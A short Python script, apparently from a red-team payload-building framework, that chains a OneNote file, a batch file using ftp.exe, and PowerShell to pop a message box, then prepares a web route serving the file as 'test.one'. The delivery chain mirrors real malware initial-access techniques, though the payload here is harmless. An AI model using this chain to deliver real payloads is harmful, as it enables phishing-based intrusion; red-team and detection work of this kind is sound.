from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.mshta.mshta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe_4():
    # OneNote -> Bat -> ftp.exe -> PowerShell:MessageBox
    routes = []

    # PS-A
    ps1msgbox: AceStr = makePowershellMessageBox()
    ps1msgbox = makePowershellCommand(ps1msgbox)
    cmdline = AceStr("powershell -c \"{}\"".format(ps1msgbox))

    # BAT
    bat = makeBatFtpExec(cmdline)
    # batFile: AceFile = makeAceFile("test.bat", bat)  # for debugging

    # OneNote
    onenote = makeOnenoteBat(bat)
    #onenoteFile: AceFile = makeAceFile("test.one", onenote)  # for debugging

    # Serve
    containerServe: AceRoute = AceRoute('/test.one', onenote, download=True, downloadName='test.one')
    routes.append(containerServe)
    #serve(routes)


